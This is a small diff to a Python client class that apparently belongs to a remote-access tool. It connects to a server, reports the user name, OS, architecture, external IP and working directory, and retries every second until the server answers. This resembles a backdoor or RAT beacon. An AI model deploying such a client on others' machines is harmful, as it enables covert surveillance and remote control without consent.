@@ -135,20 +135,21 @@ class Client(object):
         return dumps({"name": getuser(), "SO": uname().sysname, "arch": uname().machine, "externalAddress": eAddress, "currentDirectory": getcwd()})
 
     def connect(self):
+        try:
             self.__Client.connect((self.__Address))
             self.__Client.send(self.identifier())
+            
+        except ConnectionRefusedError:
+            sleep(1);self.connect()
 
     def configureSocket(self):
         self.__Client = socket(AF_INET, SOCK_STREAM)
 
     def run(self):
         self.configureSocket()
-        try:
-            self.connect()
-        except Exception:
-            sleep(1);self.run()
-        finally:
-            self.listenServer()
+        self.connect()
+        
+        self.listenServer()
 
 
 def main():
